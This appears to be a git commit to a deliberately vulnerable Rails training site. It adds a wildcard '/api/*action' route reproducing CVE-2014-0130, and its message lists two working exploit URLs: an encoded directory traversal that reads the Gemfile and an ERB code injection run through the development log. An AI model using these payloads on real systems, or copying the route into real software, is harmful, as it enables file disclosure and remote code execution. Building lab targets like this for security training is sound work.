5d5ed5dbc8ad46eb60412e806908995d78a9f284
jesse <jesse@auraredeye.com>
2014-07-18 12:47:04 +1200

    Add CVE-2014-0130 vulnerable code
    * Adds a vulnerable glob route and controller to use
    
    * Writeups around exploit:
      http://matasano.com/research/AnatomyOfRailsVuln-CVE-2014-0130.pdf
      http://blog.flowdock.com/2014/05/07/how-we-found-a-directory-traversal-vulnerability-in-rails-routes/
    
    * Known working exploit examples:
     * Dir Traversal
      localhost:3000/api/%5c%2e%2e%2f%5c%2e%2e%2f%5c%2e%2e%2fGemfile
     * Code Injection (using log to send back evidence)
      localhost:3000/api/%5c%2e%2e%2f%5c%2e%2e%2f%5c%2e%2e%2flog%2fdevelopment%2elog?codetoexec=%3c%25%3d%20%70%20%70%61%72%61%6d%73%20%25%3e

--- config/routes.rb
+++ config/routes.rb
@@ -1,4 +1,5 @@
 VulnerableRubyWebsite::Application.routes.draw do
+  get "standard/index"
   # The priority is based upon order of creation:
   # first created -> highest priority.
 
@@ -45,7 +46,7 @@ VulnerableRubyWebsite::Application.routes.draw do
   #     # (app/controllers/admin/products_controller.rb)
   #     resources :products
   #   end
-
+  get '/api/*action', controller: 'standard'
   # You can have the root of your site routed with "root"
   # just remember to delete public/index.html.
   # root :to => 'welcome#index'
